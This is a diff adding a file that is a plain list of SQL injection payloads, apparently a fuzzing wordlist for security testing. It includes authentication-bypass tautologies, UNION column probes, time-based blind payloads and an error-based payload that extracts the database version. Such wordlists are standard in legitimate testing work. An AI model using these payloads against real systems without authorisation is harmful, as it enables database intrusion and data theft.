@@ -1,0 +1,50 @@
+'
+"
+`
+')
+")
+`)
+')
+"
+`)
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+" OR "1"="1" #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' AND '1'='1
+' AND '1'='2
+' AND 1=1 --
+' AND 1=2 --
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+admin' --
+admin' #
+' OR 'x'='x
+' OR 1=1 LIMIT 1 --
+' HAVING 1=1 --
+' GROUP BY 1,2,3 HAVING 1=1 --
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 10--
+' ORDER BY 100--
+' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+' AND SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--
+-1 UNION SELECT 1,2,3--
+-1 UNION SELECT NULL,NULL,NULL--
+1' AND '1'='1
+1' AND '1'='2
+1' AND 1=1--
+1' AND 1=2--
